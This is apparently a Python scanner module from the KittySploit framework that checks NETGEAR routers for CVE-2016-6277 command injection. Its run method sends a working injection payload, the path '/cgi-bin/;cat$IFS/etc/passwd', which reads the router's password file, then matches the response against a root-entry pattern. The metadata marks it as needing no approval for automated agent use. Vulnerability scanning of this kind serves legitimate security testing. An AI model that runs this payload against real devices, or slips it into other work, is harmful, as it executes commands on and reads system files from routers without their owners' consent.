#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR routers R6250 before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR Routers - Remote Code Execution Detection',
        'description': 'NETGEAR routers R6250 before 1.0.4.6.Beta, R6400 before 1.0.1.18.Beta, R6700 before 1.0.1.14.Beta, R6900, R7000 before 1.0.7.6.Beta, R7100LG before 1.0.0.28.Beta, R7300DST before 1.0.0.46.Beta, R7900 before 1.0.1.8.Beta, R8000 before 1.0.3.26.Beta, D6220, D6400, D7000, and possibly others allow remote attackers to execute arbitrary commands via shell metacharacters in the path info to cgi-bin/.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'netgear', 'rce', 'iot', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.sj-vs.net/2016/12/10/temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-6277',
            'http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/',
            'https://www.kb.cert.org/vuls/id/582384',
            'http://kb.netgear.com/000036386/CVE-2016-582384',
        ],
        'cve': 'CVE-2016-6277',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/;cat$IFS/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="NETGEAR Routers - Remote Code Execution detected",
                path='/cgi-bin/;cat$IFS/etc/passwd',
            )
            return True
        return False

